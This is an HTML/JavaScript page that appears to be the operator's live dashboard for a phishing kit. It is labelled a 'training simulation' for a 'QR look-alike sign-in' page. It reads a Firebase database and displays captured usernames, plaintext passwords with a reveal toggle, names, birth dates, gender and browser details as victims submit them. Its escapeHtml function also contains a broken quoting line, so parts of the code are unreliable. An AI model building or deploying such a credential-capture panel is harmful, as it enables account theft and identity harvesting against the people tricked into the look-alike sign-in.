<!doctype html><html lang='en'><head><meta charset='utf-8'/><meta name='viewport' content='width=device-width, initial-scale=1'/><title>Live Panel — Training Simulation</title><link href='https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap' rel='stylesheet'><style>:root{--bg:#0f1113;--card:#202124;--bd:#3c4043;--txt:#e8eaed;--mut:#9aa0a6;--accent:#8ab4f8}body{margin:0;background:var(--bg);color:var(--txt);font-family:Roboto,system-ui,-apple-system,Segoe UI,Helvetica,Arial,sans-serif}header{display:flex;align-items:center;justify-content:space-between;padding:12px 18px;background:#17181a;border-bottom:1px solid var(--bd);position:sticky;top:0}h1{font-size:1.1rem;margin:0}.pill{background:#1f2937;color:#93c5fd;padding:6px 10px;border-radius:999px;font-weight:500}main{padding:18px}table{width:100%;border-collapse:separate;border-spacing:0 8px}th,td{padding:10px 12px;text-align:left}th{color:#bdc1c6;font-weight:500}tr{background:var(--card);border:1px solid var(--bd)}tr td:first-child{border-top-left-radius:8px;border-bottom-left-radius:8px}tr td:last-child{border-top-right-radius:8px;border-bottom-right-radius:8px}.muted{color:#9aa0a6}.mask{filter: blur(5px)}button{background:#8ab4f8;color:#202124;border:0;border-radius:20px;padding:8px 12px;cursor:pointer}.controls{display:flex;gap:8px;align-items:center}</style></head><body><header><h1>Live Panel — QR Look‑alike Sign‑in & Create</h1><div class='controls'><span class='pill'>Session: <strong id='sessionLabel'></strong></span><span class='pill'>Submissions: <strong id='count'>0</strong></span><button id='toggleMask'>Show Passwords</button><button id='clear' style='background:#5f6368;color:#fff'>Clear (local view)</button></div></header><main><table><thead><tr><th>When</th><th>Flow</th><th>Identifier / Name</th><th>Password / DOB-Gender</th><th class='muted'>Device / Browser</th></tr></thead><tbody id='rows'></tbody></table></main><script src='https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js'></script><script src='https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js'></script><script src='firebase-config.js'></script><script>const app=firebase.initializeApp(window.FIREBASE_CONFIG);const db=firebase.database();const sessionId=window.SESSION_ID||'demo-session-1';document.getElementById('sessionLabel').textContent=sessionId;const rows=document.getElementById('rows');const countEl=document.getElementById('count');let masked=true;document.getElementById('toggleMask').addEventListener('click',()=>{masked=!masked;document.querySelectorAll('.pw').forEach(el=>el.classList.toggle('mask',masked));document.getElementById('toggleMask').textContent=masked?'Show Passwords':'Hide Passwords';});document.getElementById('clear').addEventListener('click',()=>{rows.innerHTML='';countEl.textContent='0';});const ref=db.ref(`sessions/${sessionId}/entries`).limitToLast(300);let count=0;ref.on('child_added',snap=>{const v=snap.val()||{};const tr=document.createElement('tr');const when=new Date(v.ts||Date.now()).toLocaleTimeString();let main='', sub='';if(v.flow==='create'){main=[v.first||'',v.last||''].filter(Boolean).join(' ').trim();sub=[(v.month||''),(v.day||''),(v.year||'')].filter(Boolean).join(' ')+' • '+(v.gender||'');}else{main=v.username||'';sub=v.password||'';}tr.innerHTML=`<td>${when}</td><td>${v.flow||'signin'}</td><td>${escapeHtml(main)}</td><td class='${v.flow==='signin'?'pw':''} ${masked&&v.flow==='signin'?'mask':''}'>${escapeHtml(sub)}</td><td class='muted'>${escapeHtml(v.ua||'')}</td>`;rows.prepend(tr);count+=1;countEl.textContent=String(count);});function escapeHtml(str){return (str||'').toString().replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',''':'&#39;'}[c]));}</script></body></html>